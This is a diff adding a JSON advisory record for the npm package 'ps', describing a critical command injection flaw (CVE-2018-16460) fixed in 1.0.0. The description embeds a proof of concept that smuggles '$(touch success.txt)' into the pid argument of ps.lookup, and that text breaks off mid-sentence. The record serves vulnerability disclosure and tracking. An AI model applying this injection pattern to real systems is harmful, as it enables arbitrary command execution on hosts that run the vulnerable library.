@@ -1,0 +1,33 @@
+{
+  "packageName": "ps",
+  "lastUpdated": "2026-05-04T13:06:56.926Z",
+  "vulnerabilities": [
+    {
+      "id": "GHSA-cfhg-9x44-78h2",
+      "packageName": "ps",
+      "title": "ps Enables OS Command Injection",
+      "description": "Versions of `ps` before 1.0.0 are vulnerable to command injection.\n\n### Proof of concept:\n```js\nvar ps = require('ps');\n\nps.lookup({ pid: \"$(touch success.txt)\" }, function(err, proc) { // this method is vulnerable to command injection\n    if (err) {throw err;}\n    if (proc) {\n        console.log(proc);  // Process name, something like \"node\" or \"bash\"\n    } else {\n        console.log('No such process');\n    }\n});\n\n// Result: The file success.txt will exist on the filesystem if the touch command",
+      "severity": "critical",
+      "url": "https://github.com/advisories/GHSA-cfhg-9x44-78h2",
+      "publishedAt": "2018-09-17T20:43:59Z",
+      "modifiedAt": "2023-09-11T18:21:35Z",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-cfhg-9x44-78h2"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2018-16460"
+        }
+      ],
+      "affectedVersions": [
+        {
+          "range": "< 1.0.0",
+          "fixed": "1.0.0"
+        }
+      ],
+      "source": "github"
+    }
+  ]
+}
